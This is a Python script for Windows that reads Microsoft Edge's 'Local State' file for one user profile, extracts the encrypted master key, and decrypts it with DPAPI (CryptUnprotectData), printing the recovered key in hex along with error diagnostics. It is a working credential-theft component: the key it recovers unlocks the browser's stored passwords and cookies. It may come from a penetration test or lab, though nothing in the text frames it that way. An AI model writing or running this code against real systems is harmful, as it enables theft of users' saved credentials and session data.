import subprocess
import os
import json
import base64
import ctypes
from ctypes import wintypes

# Load the DPAPI library
crypt32 = ctypes.windll.crypt32

class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_byte))]

def decrypt_dpapi(data):
    in_blob = DATA_BLOB(len(data), (ctypes.c_byte * len(data)).from_buffer_copy(data))
    out_blob = DATA_BLOB()
    
    result = crypt32.CryptUnprotectData(
        ctypes.byref(in_blob),
        None,
        None,
        None,
        None,
        1,  # CRYPTPROTECT_UI_FORBIDDEN
        ctypes.byref(out_blob)
    )
    
    if result:
        decrypted = bytes(ctypes.string_at(out_blob.pbData, out_blob.cbData))
        crypt32.LocalFree(out_blob.pbData)
        return decrypted
    return None

# Read the encrypted key
with open(r"C:\Users\osiris_admin\AppData\Local\Microsoft\Edge\User Data\Local State", "r") as f:
    local_state = json.load(f)

encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
print("Encoded key: %s" % encrypted_key_b64[:40])
encrypted_key = base64.b64decode(encrypted_key_b64)
print("Decoded (%d bytes): %s" % (len(encrypted_key), encrypted_key[:10].hex()))

# Remove 'DPAPI' header (5 bytes)
ciphertext = encrypted_key[5:]
print("Ciphertext (%d bytes): %s" % (len(ciphertext), ciphertext[:20].hex()))

# Try DPAPI decrypt
print("\nTrying DPAPI decrypt as current user (%s)..." % os.environ['USERNAME'])
result = decrypt_dpapi(ciphertext)
if result:
    print("SUCCESS! Decrypted key: %s" % result.hex())
else:
    error = ctypes.GetLastError()
    print("Failed. Error: %d (0x%08X)" % (error, error))
    
    if error == 13:  # ERROR_INVALID_DATA
        print("Invalid data - wrong user context or key corrupted")
    elif error == 5:  # ERROR_ACCESS_DENIED
        print("Access denied")
    else:
        print("Error code meanings:")
        print("  13 = ERROR_INVALID_DATA (wrong user)")
        print("  5 = ERROR_ACCESS_DENIED")
        print("  1314 = ERROR_PRIVILEGE_NOT_HELD")
        print("  -2146893813 = NTE_FAIL")
